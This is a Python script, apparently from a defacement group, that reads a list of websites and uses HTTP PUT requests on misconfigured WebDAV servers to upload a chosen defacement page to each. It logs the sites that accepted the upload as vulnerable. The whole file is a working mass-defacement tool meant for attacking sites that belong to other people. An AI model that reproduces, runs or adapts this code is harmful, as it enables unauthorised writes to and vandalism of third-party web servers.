#!/usr/bin/python
#-*- coding: utf-8 -*-
#Code Upload By Black devil modified [bd]
try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """
            _____                   _               _   _      _    
|_   _|                 (_)             | | | |    | |   
  | | ___ _ __ _ __ ___  _  __ _ _ __   | |_| | ___| | __
  | |/ _ \ '__| '_ ` _ \| |/ _` | '_ \  |  _  |/ _ \ |/ /
  | |  __/ |  | | | | | | | (_| | | | | | | | |  __/   < 
  \_/\___|_|  |_| |_| |_|_|\__,_|_| |_| \_| |_/\___|_|\_\  
  Webdav defacer
  
  Team - INDIAN CYBER NINJAS
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'
file = open('result.txt','w')

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="list.txt"):
   dface = "/"+script+"\n"
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("File Upload to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" no vuln"+m+" ] %s/%s"%(site,script))
            else:
               invisible = site + dface
               file.write(invisible)
               print(m+"["+h+" vuln "+m+" ] %s/%s"%(site,script)) 
         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x(" Your Deface Page Path : ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)
   file.close()

if __name__ == "__main__":
    main(banner)